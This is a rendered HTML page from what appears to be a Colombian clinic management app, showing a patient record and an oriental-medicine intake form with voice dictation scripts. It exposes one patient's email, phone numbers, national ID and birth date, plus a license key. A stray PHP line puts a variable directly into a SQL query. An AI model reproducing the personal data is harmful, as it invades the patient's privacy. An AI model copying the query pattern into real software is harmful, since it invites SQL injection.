
<script type="text/javascript">
  document.addEventListener("DOMContentLoaded", function(){
    // Invocamos cada 5 segundos ;)
    const milisegundos = 5 *1000;
    setInterval(function(){
        // No esperamos la respuesta de la petición porque no nos importa
        fetch("refrescar.php").then((response) => {
          return response.text();
        })
        .then((myContent) => {
      //alert(myContent);
      console.log(myContent);
    });

      },milisegundos);
  });
</script>



<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>  Medicalsoft - estetica  </title>
  <!-- Tell the browser to be responsive to screen width -->

  <!-- para el tema de los acentos con mysql -->

  <meta http-equiv="Content-type" content="text/html; charset=utf-8" />

  <!-- para el tema de los acentos con mysql -->


  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.6 -->
  <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">


  <!-- 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
  <script src="https://kit.fontawesome.com/7d70315043.js" crossorigin="anonymous"></script>
-->

<!-- Font Awesome -->
<link rel="stylesheet" href="css/font-awesome.css">
<script src="js/kit.fontawesome.js" crossorigin="anonymous"></script>
<!-- Ionicons -->

<!-- jvectormap -->
<link rel="stylesheet" href="plugins/jvectormap/jquery-jvectormap-1.2.2.css">
<!-- Theme style -->
<link rel="stylesheet" href="dist/css/AdminLTE2.min.css">
<!-- daterange picker -->
<link rel="stylesheet" href="plugins/daterangepicker/daterangepicker.css">
<!-- bootstrap datepicker -->
<link rel="stylesheet" href="plugins/datepicker/datepicker3.css">
<!-- iCheck for checkboxes and radio inputs -->
<link rel="stylesheet" href="plugins/iCheck/all.css">
<!-- Bootstrap Color Picker -->
<link rel="stylesheet" href="plugins/colorpicker/bootstrap-colorpicker.min.css">
<!-- Bootstrap time Picker -->
<link rel="stylesheet" href="plugins/timepicker/bootstrap-timepicker.min.css">
<!-- Select2 -->
<link rel="stylesheet" href="plugins/select2/select2.min.css">
<!-- Theme style -->

<link rel="stylesheet" href="plugins/morris/morris.css">

<link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">
<link rel="shortcut icon" type="image/x-icon" href="./icono.ico">

   <!-- AdminLTE Skins. Choose a skin from the css/skins
     folder instead of downloading all of them to reduce the load. -->
     <link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">

     <link rel="stylesheet" href="plugins/datatables/dataTables.bootstrap.css">

     <link rel="stylesheet" href="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css">

     <link rel="stylesheet" href="plugins/fullcalendar/fullcalendar.min.css">
     <link rel="stylesheet" href="plugins/fullcalendar/fullcalendar.print.css" media="print">
     <!-- Theme style -->

     <!--End of Zendesk Chat Script-->


     <!-- better icons -->


     <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
     <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
<![endif]-->
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <!--Start of Zendesk Chat Script-->
  <script type="text/javascript">
    window.$zopim||(function(d,s){var z=$zopim=function(c){z._.push(c)},$=z.s=
      d.createElement(s),e=d.getElementsByTagName(s)[0];z.set=function(o){z.set.
        _.push(o)};z._=[];z.set._=[];$.async=!0;$.setAttribute("charset","utf-8");
        $.src="https://v2.zopim.com/?65r3mACnIFh8hYjJwvyl5pg2FZqM7yDU";z.t=+new Date;$.
        type="text/javascript";e.parentNode.insertBefore($,e)})(document,"script");
      </script>
      <!--End of Zendesk Chat Script-->






<!-- 
<script type="text/javascript">
    (function () {
        var options = {
            whatsapp: "+17863295472", // WhatsApp number
            call_to_action: "Soporte", // Call to action
            position: "left", // Position may be 'right' or 'left'
        };
        var proto = document.location.protocol, host = "whatshelp.io", url = proto + "//static." + host;
        var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';
        s.onload = function () { WhWidgetSendButton.init(host, proto, options); };
        var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
    })();
</script>
-->







</head>
<body  class="hold-transition skin-blue sidebar-mini" >

  <div class="wrapper">
    <header class="main-header">

      <!-- Logo -->
      <a href="portada.php" class="logo">
       <span class="logo-mini">  <img src="img/logoSolo.png" width="90%" height="90%"></span>

      <!-- mini logo for sidebar mini 50x50 pixels 
        <span class="logo-mini"><b>D</b></span>-->
        <span class="logo-lg">  <img src="img/logoletras.png" width="90%" height="90%"> </span>
      <!-- logo for regular state and mobile devices
        <span class="logo-lg"><b>Triple</b>D</span> -->
      </a>

      <!-- Header Navbar: style can be found in header.less -->
      <nav class="navbar navbar-static-top">
        <!-- Sidebar toggle button-->
        <a href="#" class="sidebar-toggle nav-abierto" id="nav-collapse-nuevo" data-toggle="offcanvas" role="button" onclick="closeNav()">
          <span class="sr-only">Toggle navigation</span>
        </a>



        <!-- Navbar Right Menu -->
        <div class="navbar-custom-menu">

          <ul class="nav navbar-nav">





            <li class="dropdown notifications-menu">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                <i class="fa fa-bell-o"></i>
                <span class="label label-warning">0</span>
              </a>

            </li>
            <li  title="Soporte">
              <a href="soporte" >
                <i class="fa fa-support"></i>
              </a>
            </li>

            <li  title="Perfil">
              <a href="config">
                <i class="fa fa-gears"></i>
              </a>
            </li>




            <li  title="Salir">
              <a href="funciones/salir.php">
                <i class="fa fa-close"></i>
              </a>
            </li>

            <!-- User Account: style can be found in dropdown.less -->
            <li class="dropdown user user-menu">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                <img src="{$Base}/logos/logoSolo.png" height="10px" width="10px" class="user-image" alt="User Image">              

                <span class="hidden-xs">         master            </span>
              </a>
              <ul class="dropdown-menu">
                <!-- User image -->
                <li class="user-header">
                  <img src="{$Base}/logos/logoSolo.png" height="50%" width="50%" class="user-image" alt="User Image">           

                  <p>
                   Usuario Principal 
                   <small>master</small>
                 </p>

                 <a target="_blank" href="licencias/lic.php?licencia=391842009018309256387&li=1">
                  <font size="2" color="#FFFFFF"> Licencia:  
                  CO50202101021  </font> </a>
                  <strong> <font color="#FFFFFF"> Lic Vitalicia </font></strong>
                </li>

                <!-- Menu Body -->
                <li class="user-body">

                  <div class="row">
                    <div class="col-xs-12 text-center">
                    Inicio Sesion:10/08/2021, 04:38:20                  </div>

                    <div class="col-xs-6 text-center">
                     <!--     <a href="funciones/salir.php" class="btn btn-default btn-flat">Facturacion</a>-->

                   </div>
                   <div class="col-xs-6 text-center">
                    <!--       <a href="funciones/salir.php" class="btn btn-default btn-flat">Mi Perfil</a>-->

                  </div>
                </div>


              </li>
              <!-- Menu Footer-->
              <li class="user-footer">
                <div class="pull-left">
                 <a href="soporte" class="btn btn-default btn-flat">Soporte</a> 
               </div>

               <div class="pull-left">
                 <a href="config" class="btn btn-default btn-flat">Perfil</a> 
               </div>


               <div class="pull-right">
                <a href="funciones/salir.php" class="btn btn-default btn-flat">Cerrar Sesion</a>
              </div>

            </li>
          </ul>
        </li>
        <!-- Control Sidebar Toggle Button -->

      </ul>
    </div>

  </nav>
</header><!-- estilos para el menu nuevo de la izquierda -->

<!--<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">-->
  <link href="css/menu1.css" rel="stylesheet" type="text/css" media="all">
  <link href="css/style.css" rel="stylesheet" type="text/css" media="all">
  <style>
  .txt_rsp
  {
    font-size: 2vw!important;
  }
  @media screen and (max-width: 766px) {
   .txt_rsp
   {
    font-size: 4vw!important;
  } 
}
</style>
<script src="js/iconify.min.js"></script>

<!-- final // estilos para el menu nuevo de la izquierda -->

<aside class="main-sidebar">
  <!-- sidebar: style can be found in sidebar.less -->
  <section id="sidebar" class="sidebar sidebar-nav_izquierdo">

    <ul class="sidebar-menu list-unstyled components mb-5">

      <li style="padding: 10px;text-align: center;">
       <span class="">Menú   0</span> 
     </li>

     <li>
      <a href="{$Base}/portada"><i  class="iconify" data-icon="ion:desktop"></i> <span class="">Escritorio</span></a>
    </li>

    <li>
      <a href="{$Base}/config"><i class="iconify" data-icon="ion:construct" ></i> <span class="">Configuración y perfil</span></a>
    </li>

    <li>
      <a href="{$Base}/Pacientes.php"><i class="iconify" data-icon="ion:person"></i> <span class="">Historia Clinica</span></a>
    </li>

        <!-- <li>
          <a href="https://medicalsoftplus.com/baseDev/patientes"><i class="iconify" data-icon="ion:id-card"></i> <span class="">Historia Clinica V1</span></a>
        </li> -->

        <li>
          <a href="{$Base}/configPacientes.php?id=30"><i class="iconify" data-icon="ion:id-card-outline"></i> <span class="">ALTERNATIVA </span></a>
        </li><li>
          <a href="{$Base}/configPacientes.php?id=31"><i class="iconify" data-icon="ion:id-card-outline"></i> <span class="">Medicina Oriental </span></a>
        </li>   

        <li>
          <a href="{$Base}pacientesTest.php"><i class="iconify" data-icon="ion:receipt"></i> <span class="">Test Coronavirus</span></a>
        </li>

        <li>
          <a><i class="iconify" data-icon="ri:medicine-bottle-fill"></i> <span class="">Recetario</span></a>
          <ul class="nav-flyout">
            <li>
              <a href="{$Base}/pacientesRecetario.php"><i class="iconify" data-icon="raphael:paper"></i> <span class="">Generar Receta</span></a>
            </li>
            <li>
              <a href="{$Base}/AgregarMedicamento.php"><i class="iconify" data-icon="ri:medicine-bottle-fill"></i> <span class="">Agregar Medicamento</span></a>
            </li>
            <li>
              <a href="{$Base}/formulas.php"><i class="iconify" data-icon="ri-file-list-fill"></i> <span class="">Gestionar Formulas</span></a>
            </li>

          </ul>
        </li>

        <li>
          <a ><i class="iconify" data-icon="fluent:people-team-toolbox-24-filled"></i> <span>Control de Citas</span></a>
          <ul class="nav-flyout">
            <li>
              <a href="{$Base}/agregarCitas"><i class="iconify" data-icon="bx:bxs-book-add"></i><span>Registrar Citas</span></a>
            </li>
            <li>
              <a href="{$Base}/controlCitas"><i class="iconify" data-icon="mdi:book-open-page-variant-outline" ></i><span>Gestionar Citas</span></a>
            </li>
            <li>
              <a href="{$Base}/calendarioagenda"><i class="iconify" data-icon="ion:today"></i><span>Ver calendario</span></a>
            </li>
          </ul>
        </li>

        <li>
          <a ><i class="iconify" data-icon="fa-solid:book-reader"></i> <span>Oportunidad de Citas</span></a>
          <ul class="nav-flyout">
            <li>
              <a href="{$Base}/gruposAtencion.php"><i class="iconify" data-icon="fluent:shifts-team-24-filled"></i><span>Grupos de Atención</span></a>
            </li>
            <li>
              <a href="{$Base}/vista1.php"><i class="iconify" data-icon="grommet-icons:schedules"></i><span>Agenda General</span></a>
            </li>
            <li>
              <a href="{$Base}/portada2.php"><i class="iconify" data-icon="vaadin:calendar-user"></i><span>Citas por Cliente</span></a>
            </li>
          </ul>
        </li>

        <li>
          <a href="{$Base}/pacientes_consentimiento.php"><i class="iconify" data-icon="ri:file-paper-2-fill"></i> <span class="">Consentimientos</span></a>
        </li>

        <li>
          <a href="{$Base}/pacientes_certificados.php"><i class="iconify" data-icon="ri:file-list-3-line"></i> <span class="">Certificados/Documentos</span></a>
        </li>

        <li>
          <a ><i class="iconify" data-icon="fa-solid:file-invoice"></i> <span>Presupuestos</span></a>
          <ul class="nav-flyout">
            <li>
              <a href="{$Base}/SclienteAdministracion_presupuestos"><i class="iconify" data-icon="fluent:receipt-money-20-filled"></i><span>Realizar Presupuestos</span></a>
            </li>
            <li>
              <a href="{$Base}/SclienteAdministracion_ControlPresupuesto"><i class="iconify" data-icon="fluent:building-retail-money-24-filled"></i><span>Control de Presupuestos</span></a>
            </li>
          </ul>
        </li>




        <li>
          <a ><i class="iconify" data-icon="fa-solid:file-invoice"></i> <span>Facturas </span></a>
          <ul class="nav-flyout">
            <li>
              <a href="{$Base}/SclienteAdministracion_facturas"><i class="iconify" data-icon="fluent:receipt-money-20-filled"></i><span>Realizar Facturas</span></a>
            </li>
            <li>
              <a href="{$Base}/SclienteAdministracion_Controlfacturas"><i class="iconify" data-icon="fluent:building-retail-money-24-filled"></i><span>Control de Facturas</span></a>
            </li>


            <li>
              <a href="{$Base}/SclienteAdministracion_cuentasAcobrar"><i class="iconify" data-icon="fluent:building-retail-money-24-filled"></i><span>Cuentas a cobrar</span></a>
            </li>
          </ul>
        </li>




        
        <li>
          <a ><i class="iconify" data-icon="ic:twotone-inventory-2" ></i> <span>Inventarios</span></a>
          <ul class="nav-flyout">
            <li>
              <a href="{$Base}/inventario"><i class="iconify" data-icon="gridicons:product-downloadable" ></i><span>Registro productos</span></a>
            </li>
            <li>
              <a href="{$Base}/tipoinventarios"><i class="iconify" data-icon="ion:business"></i><span>Registro departamentos</span></a>
            </li>
            <li>
              <a href="{$Base}/listaInventario"><i class="iconify" data-icon="fluent:clipboard-task-list-ltr-20-filled"></i><span>Lista de productos</span></a>
            </li>
            <li>
              <a href="{$Base}/salidadeinventario"><i class="iconify" data-icon="icomoon-free:box-remove" ></i><span>Salida de inventario</span></a>
            </li>
            <li>
              <a href="{$Base}/entradadeinventario"><i class="iconify" data-icon="icomoon-free:box-add"></i><span>Entrada de inventario</span></a>
            </li>
          </ul>
        </li>

        <li>
          <a ><i class="iconify" data-icon="whh:report"></i> <span>Reportes</span></a>
          <ul class="nav-flyout">
            <li>
              <a href="{$Base}/Reportespacientes"><i class="iconify" data-icon="fluent:patient-24-filled"></i><span>Pacientes</span></a>
            </li>
            <li>
              <a href="{$Base}/Reportescitas"><i class="iconify" data-icon="teenyicons:appointments-outline" ></i><span>Citas</span></a>
            </li>
            <li>
              <a href="{$Base}/Reportesfacturacion"><i class="iconify" data-icon="fa-solid:file-invoice-dollar"></i><span>Facturas</span></a>
            </li>
            <li>
              <a href="{$Base}/Reportesinventario"><i class="iconify" data-icon="system-uicons:box-open"></i><span>Inventarios</span></a>
            </li>
            <li>
              <a href="{$Base}/Rips.php"><i class="iconify" data-icon="si-glyph:book-open"></i><span>Rips</span></a>
            </li>
          </ul>
        </li>

        <li>
          <a href="{$Base}/clienteAdministracion_VideoChat"><i class="iconify" data-icon="bx:bxs-video-recording"></i> <span class="">Video Consulta</span></a>
        </li>

        <li>
          <a href="{$Base}/anuncio"><i class="iconify" data-icon="bi:book-half"></i> <span class="">Directorios médicos</span></a>
        </li>

        <li>
          <a href="{$Base}/funciones/salir.php"><i class="iconify" data-icon="ion:exit-outline"></i> <span class="">Salir</span></a>
        </li>
        
      </ul>

    </section>
  </aside>

  <style type="text/css">
  .select2-container .select2-selection--single 
  {
    height: 47px!important;
    padding: 15px!important;
  }
</style>




















$queryconfig=mysqli_query($conn3,"SELECT * FROM  config where ID_Usuario=$ID");

?>
<link rel="stylesheet" href="apiVoz.css">

<!-- Content Wrapper. Contains page content -->
<div class="content-wrapper">
  <!-- Content Header (Page header) -->
  <section class="content-header">
    <h1>Oriental, Paciente:  Fanny  , Edad: 79 Años       </h1>
    <ol class="breadcrumb">
            <!--<li><a href="portada"><i class="fa fa-dashboard"></i> Escritorio</a></li>
              <li><a href="#"> Oriental  </a></li>-->
            </ol>
          </section>
          <!-- Main content -->
          <section class="content">
            <div class="row">
              <div class="col-xs-12">

                <div class="box">
                  <!-- /.box-header -->
                  <div class="box-body">

                    <div class="col-md-12">

                      <div class="box box-solid">

                        <!-- /.box-header -->
                        <div class="box-body">
                          <div class="box-group" id="accordion1">
                            <!-- we are adding the .panel class so bootstrap.js collapse plugin detects it -->
                            <div class="panel box box-primary">
                              <div class="box-header with-border">
                                <h4 class="box-title">
                                  <a data-toggle="collapse" data-parent="#accordion1" href="#collapseOne">
                                    Datos personales
                                  </a>
                                </h4>
                              </div>



                              <div id="collapseOne" class="panel-collapse collapse">


                                <div class="box-body">
                                 <div class="row">

                                  <div class="col-md-5">
                                   <label><strong>Correo:</strong></label>
                                   <label> yarimeortega23@hotmail.com  </label>

                                   <br>
                                   <label><strong>Nombre:</strong></label>
                                   <label> Fanny   </label>

                                   <br>
                                   <label><strong>Celular:</strong></label>
                                   <label> 3017277150 </label>

                                   <br>
                                   <label><strong>Ciudad:</strong></label>
                                   <label>1</label>

                                   <br>
                                   <label><strong>Fecha registro:</strong></label>
                                   <label>2021-01-26 15:31:43</label>

                                   <br>
                                   <label><strong>Cedula o ID:</strong></label>
                                   <label>33111555</label>
<!--
															<br>
															<label><strong> Es donante:</strong></label>
															<label></label> -->

															<br>
															<label><strong>Entidad de salud :</strong></label>
															<label></label>
															
															
														</div>

														<div class="col-md-5">
															

															<label><strong> Fecha de nacimiento :</strong></label>
															<label>1942-02-28</label>

															<br>
															<label><strong> Edad :</strong></label>
															<label>79 Años</label>

															<br>
															<label><strong>Genero:</strong></label>
															<label>F</label>
<!--
															<br>
															<label><strong>Profesión :</strong></label>
															<label></label>  -->

															<br>
															<label><strong>Tipo de sangre :</strong></label>
															<label>  </label>

															<br>
															<label><strong>  Dirección cliente:</strong></label>
															<label>  </label>

															<br>
															<label><strong> Teléfono :</strong></label>
															<label>6797969</label>
															
															<!--<br>
															<label><strong>Tiene alguna Discapacidad :</strong></label>
															<label></label>-->

															<!--<br>
															<label><strong>Discapacidad:</strong></label>
															<label></label>-->

															<br>
															<label><strong>Ocupación :</strong></label>
															<label></label>


														</div>

														<div class="col-md-2">


														</div>
													</div>

													<div class="row">
														<div class="col-md-12">
															<hr>
														</div>
													</div>

													<div class="col-md-12">
														<div class="col-md-12">
															<label><strong>Toma algún medicamento:</strong></label>
															<label>  </label>
														</div>
														<div class="form-group col-md-2" align="right">
															Alergias a las aines  
														</div>

														<div class="form-group col-md-2" align="right">
															Asma 
														</div>

														<div class="form-group col-md-2" align="right">
															HTA 
														</div>

														<div class="form-group col-md-2" align="right">
															Diabetes 
														</div>

														<div class="form-group col-md-2" align="right">
															Hipotiroidismo 
														</div>

														<div class="form-group col-md-2" align="right">
															Tabaquismo 
														</div>

														<div class="form-group col-md-2" align="right">
															Licor 
														</div>

														<div class="form-group col-md-2" align="right">
															Otras Alergias 
														</div>

														<div class="form-group col-md-2" align="right">
															Cirugías 
														</div>
													</div>
													<div class="form-group col-md-12" >
														<label><strong>Antecedentes Familiares:</strong></label>
														<label></label>.
														<br>
														<label><strong>Alergias :</strong></label>
														<label>  </label>
														<br>
														<label><strong>Notas adicionales :</strong></label>
														<label></label>.
													</div>
												</div>
                      </div>
                    </div>


                    





                    <form action="configProcesarFormulario.php" method="POST" name="oriental" enctype="multipart/form-data">








                      <div class="form-group col-md-3">
                       <div align="left">  NT </div>

                       <select   name="xnt647[]" class="form-control select2"  style="width: 100%;" multiple>
                        <option value="" select> Seleccionar </option>
                        <option value="T" >T</option>   
                        <option value="M" >M</option>   
                        <option value="S" >S</option>   
                      </select>
                    </div><div class="form-group col-md-3">
                     <div align="left">  WT </div>

                     <select   name="xwt705[]" class="form-control select2"  style="width: 100%;" multiple>
                      <option value="" select> Seleccionar </option>
                      <option value="H" > H </option>           
                      <option value="M" > M </option>           
                      <option value="L" > L </option>           
                    </select>
                  </div><div class="form-group col-md-3">
                   <div align="left">  TEMPERATURA ºC </div>
                   <input type="text" class="form-group col-md-3 form-control input-lg" name="xtemperatu962"   placeholder="" id = "xtemperatu962" 0  value="0" maxlength="20">


                 </div><div class="form-group col-md-3">
                   <div align="left">  BLOOD PRESSURE mmHg </div>
                   <input type="text" class="form-group col-md-3 form-control input-lg" name="xbloodpres924"   placeholder="" id = "xbloodpres924" 0  value="0" maxlength="20">


                 </div><div class="form-group col-md-1">
                   <div align="left">  HEART </div>
                   <input type="text" class="form-group col-md-1 form-control input-lg" name="xheart150"   placeholder="" id = "xheart150" 0  value="0" maxlength="20">


                 </div><div class="form-group col-md-2">
                   <div align="left">  RATE </div>
                   <input type="text" class="form-group col-md-2 form-control input-lg" name="xrate961"   placeholder="" id = "xrate961" 0  value="0" maxlength="20">


                 </div><div class="form-group col-md-2">
                   <div align="left">  BPM </div>
                   <input type="text" class="form-group col-md-2 form-control input-lg" name="xbpm649"   placeholder="" id = "xbpm649" 0  value="0" maxlength="20">


                 </div><div class="form-group col-md-1">
                   <div align="left">  RHYTHM </div>
                   <input type="text" class="form-group col-md-1 form-control input-lg" name="xrhythm399"   placeholder="" id = "xrhythm399" 0  value="0" maxlength="20">


                 </div><div class="form-group col-md-1">
                   <div align="left">  LUNG </div>
                   <input type="text" class="form-group col-md-1 form-control input-lg" name="xlung466"   placeholder="" id = "xlung466" 0  value="0" maxlength="20">


                 </div><div class="form-group col-md-2">
                   <div align="left">  RATE </div>
                   <input type="text" class="form-group col-md-2 form-control input-lg" name="xrate251"   placeholder="" id = "xrate251" 0  value="0" maxlength="20">


                 </div><div class="form-group col-md-3">
                   <div align="left">  SOUND </div>
                   <input type="text" class="form-group col-md-3 form-control input-lg" name="xsound168"   placeholder="" id = "xsound168" 0  value="0" maxlength="20">


                 </div><div class="form-group col-md-12" align= "center"> <strong> SUBJETIVE</strong></div>
                 <script type="text/javascript">


                   var recognition1700;
                   var recognizing1700 = false;
                   if (!('webkitSpeechRecognition' in window)) {
                    alert("¡API no soportada!");
                  } else {

                    recognition1700 = new webkitSpeechRecognition();
                    recognition1700.lang = "es-CO";
                    recognition1700.continuous = true;
                    recognition1700.interimResults = true;

                    recognition1700.onstart = function() {
                      recognizing1700 = true;
                      console.log("empezando a eschucar");
                    }
                    recognition1700.onresult = function(event) {

                     for (var i = event.resultIndex; i < event.results.length; i++) {
                      if(event.results[i].isFinal)
                        document.getElementById("xresponset716").value += event.results[i][0].transcript;
                    }

            //texto
          }
          recognition1700.onerror = function(event) {
          }
          recognition1700.onend = function() {
            recognizing1700 = false;
            document.getElementById("procesar1700").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1700() {

          if (recognizing1700 == false) {
            recognition1700.start();
            recognizing1700 = true;
            document.getElementById("procesar1700").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1700.stop();
            recognizing1700 = false;
            document.getElementById("procesar1700").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-12">
       <div align="left">  RESPONSE TO LAST Tx. </div>


       <div align="right">
        <a onclick="procesar1700()" id="procesar1700"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="xresponset716" name="xresponset716"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div>
    <script type="text/javascript">


     var recognition1701;
     var recognizing1701 = false;
     if (!('webkitSpeechRecognition' in window)) {
      alert("¡API no soportada!");
    } else {

      recognition1701 = new webkitSpeechRecognition();
      recognition1701.lang = "es-CO";
      recognition1701.continuous = true;
      recognition1701.interimResults = true;

      recognition1701.onstart = function() {
        recognizing1701 = true;
        console.log("empezando a eschucar");
      }
      recognition1701.onresult = function(event) {

       for (var i = event.resultIndex; i < event.results.length; i++) {
        if(event.results[i].isFinal)
          document.getElementById("xchiefcomp815").value += event.results[i][0].transcript;
      }

            //texto
          }
          recognition1701.onerror = function(event) {
          }
          recognition1701.onend = function() {
            recognizing1701 = false;
            document.getElementById("procesar1701").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1701() {

          if (recognizing1701 == false) {
            recognition1701.start();
            recognizing1701 = true;
            document.getElementById("procesar1701").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1701.stop();
            recognizing1701 = false;
            document.getElementById("procesar1701").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-12">
       <div align="left">  CHIEF COMPLAINT </div>


       <div align="right">
        <a onclick="procesar1701()" id="procesar1701"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="xchiefcomp815" name="xchiefcomp815"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div>
    <script type="text/javascript">


     var recognition1702;
     var recognizing1702 = false;
     if (!('webkitSpeechRecognition' in window)) {
      alert("¡API no soportada!");
    } else {

      recognition1702 = new webkitSpeechRecognition();
      recognition1702.lang = "es-CO";
      recognition1702.continuous = true;
      recognition1702.interimResults = true;

      recognition1702.onstart = function() {
        recognizing1702 = true;
        console.log("empezando a eschucar");
      }
      recognition1702.onresult = function(event) {

       for (var i = event.resultIndex; i < event.results.length; i++) {
        if(event.results[i].isFinal)
          document.getElementById("xpresentil721").value += event.results[i][0].transcript;
      }

            //texto
          }
          recognition1702.onerror = function(event) {
          }
          recognition1702.onend = function() {
            recognizing1702 = false;
            document.getElementById("procesar1702").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1702() {

          if (recognizing1702 == false) {
            recognition1702.start();
            recognizing1702 = true;
            document.getElementById("procesar1702").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1702.stop();
            recognizing1702 = false;
            document.getElementById("procesar1702").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-12">
       <div align="left">  PRESENT ILLINESS </div>


       <div align="right">
        <a onclick="procesar1702()" id="procesar1702"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="xpresentil721" name="xpresentil721"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div><div class="form-group col-md-12" align= "center"> <strong> OBJECTIVE</strong></div>
    <script type="text/javascript">


     var recognition1704;
     var recognizing1704 = false;
     if (!('webkitSpeechRecognition' in window)) {
      alert("¡API no soportada!");
    } else {

      recognition1704 = new webkitSpeechRecognition();
      recognition1704.lang = "es-CO";
      recognition1704.continuous = true;
      recognition1704.interimResults = true;

      recognition1704.onstart = function() {
        recognizing1704 = true;
        console.log("empezando a eschucar");
      }
      recognition1704.onresult = function(event) {

       for (var i = event.resultIndex; i < event.results.length; i++) {
        if(event.results[i].isFinal)
          document.getElementById("xphysicale946").value += event.results[i][0].transcript;
      }

            //texto
          }
          recognition1704.onerror = function(event) {
          }
          recognition1704.onend = function() {
            recognizing1704 = false;
            document.getElementById("procesar1704").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
            console.log("terminó de eschucar, llegó a su fin");

          }

        }

        function procesar1704() {

          if (recognizing1704 == false) {
            recognition1704.start();
            recognizing1704 = true;
            document.getElementById("procesar1704").innerHTML = "<i title='Detener Grabación' style='font-size: 18px;' class='fa fa-pause'>";
          } else {
            recognition1704.stop();
            recognizing1704 = false;
            document.getElementById("procesar1704").innerHTML = "<i title='Iniciar Grabación' style='font-size: 18px;' class='fa fa-fw fa-microphone'>";
          }
        }


      </script>
      <div class="form-group col-md-12">
       <div align="left">  PHYSICAL EXAM </div>


       <div align="right">
        <a onclick="procesar1704()" id="procesar1704"><i title="Iniciar Grabación" style="font-size: 18px;" class="fa fa-fw fa-microphone"></i></a>
      </div>

      <textarea  id="xphysicale946" name="xphysicale946"  class="textarea" placeholder="" style="width: 100%; height: 100px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;" ></textarea>



    </div><div class="form-group col-md-1" align= "center"> <strong> TONGUE</strong></div><div class="form-group col-md-1" align= "center"> <strong> BODY</strong></div><div class="form-group col-md-4">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-4 form-control input-lg" name="x393"   placeholder="" id = "x393" 0  value="0" maxlength="80">


   </div><div class="form-group col-md-1" align= "center"> <strong> COATING</strong></div><div class="form-group col-md-5">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-5 form-control input-lg" name="x803"   placeholder="" id = "x803" 0  value="0" maxlength="80">


   </div><div class="form-group col-md-1" align= "center"> <strong> PULSE </strong></div><div class="form-group col-md-1" align= "center"> <strong> RT</strong></div><div class="form-group col-md-4">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-4 form-control input-lg" name="x670"   placeholder="" id = "x670" 0  value="0" maxlength="80">


   </div><div class="form-group col-md-1" align= "center"> <strong> LT</strong></div><div class="form-group col-md-5">
     <div align="left">   </div>
     <input type="text" class="form-group col-md-5 form-control input-lg" name="x703"   placeholder="" id = "x703" 0  value="0" maxlength="80">


   </div><div class="form-group col-md-12" align= "center"> <strong> “A” ASSESSMENT & “P ” TREATMENT PLAN</strong></div><div class="form-group col-md-12">
     <div align="left">  EIGHT PRINCIPLES </div>

     <select   name="xeightprin109[]" class="form-control select2"  style="width: 100%;" multiple>
      <option value="" select> Seleccionar </option>
      <option value="EXTERIOR">EXTERIOR</option>
<option value="INTERIOR">INTERIOR</option>
<option value="HEAT">HEAT</option>
<option value="COLD">COLD</option>
<option value="EXCESS">EXCESS</option>
